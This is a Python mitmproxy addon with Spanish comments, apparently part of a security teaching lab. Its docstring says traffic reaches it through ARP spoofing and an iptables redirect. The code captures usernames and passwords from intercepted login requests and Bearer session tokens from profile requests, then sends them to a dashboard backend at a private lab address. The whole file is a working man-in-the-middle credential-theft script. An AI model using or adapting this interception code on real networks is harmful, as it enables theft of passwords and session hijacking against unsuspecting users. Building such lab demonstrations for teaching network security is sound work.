"""
Addon de mitmproxy: puente Kali -> Backend (Fase 6 del laboratorio).

start-attack.sh corre mitmdump en modo transparente cargando este addon.
Cada vez que mitmproxy ve pasar una peticion HTTP hacia el backend
(gracias al ARP spoofing + la regla de iptables que redirige el trafico
hacia el puerto local de mitmproxy), este addon manda un resumen del
evento al propio backend via POST /api/events. El backend lo guarda y
lo retransmite por WebSocket a quien tenga abierto el dashboard.

Uso (lo hace start-attack.sh, no hace falta correrlo a mano):
    mitmdump --mode transparent -s mitm_bridge.py
"""

import json
import os
import threading
import urllib.request

from mitmproxy import http

BACKEND_EVENTS_URL = os.environ.get("BACKEND_EVENTS_URL", "http://192.168.56.20:4000/api/events")


def _post_event(event: dict) -> None:
    body = json.dumps(event).encode("utf-8")
    request = urllib.request.Request(
        BACKEND_EVENTS_URL,
        data=body,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        urllib.request.urlopen(request, timeout=2)
    except Exception as error:
        # El ataque no debe frenarse si el backend no responde a tiempo.
        print(f"[mitm_bridge] no se pudo enviar el evento al dashboard: {error}")


def _send_async(event: dict) -> None:
    threading.Thread(target=_post_event, args=(event,), daemon=True).start()


def _client_ip(flow: http.HTTPFlow) -> str:
    peer = getattr(flow.client_conn, "peername", None) or getattr(flow.client_conn, "address", None)
    return peer[0] if peer else "desconocido"


def request(flow: http.HTTPFlow) -> None:
    source_ip = _client_ip(flow)
    target_ip = flow.request.host

    if flow.request.method == "POST" and flow.request.path.startswith("/api/login"):
        try:
            payload = json.loads(flow.request.get_text() or "{}")
        except ValueError:
            payload = {}
        username = str(payload.get("username", "?"))
        password = str(payload.get("password", "?"))
        _send_async(
            {
                "type": "http-credentials",
                "sourceIp": source_ip,
                "targetIp": target_ip,
                "summary": f'Login interceptado: usuario "{username}"',
                "detail": {"username": username, "password": password},
            }
        )
        return

    if flow.request.path.startswith("/api/profile"):
        auth_header = flow.request.headers.get("Authorization", "")
        token = auth_header.replace("Bearer ", "").strip()
        if token:
            _send_async(
                {
                    "type": "token-replay",
                    "sourceIp": source_ip,
                    "targetIp": target_ip,
                    "summary": "Token de sesion interceptado",
                    "detail": {"token": token},
                }
            )
            return

    _send_async(
        {
            "type": "http-request",
            "sourceIp": source_ip,
            "targetIp": target_ip,
            "summary": f"{flow.request.method} {flow.request.path}",
            "detail": {"method": flow.request.method, "path": flow.request.path},
        }
    )
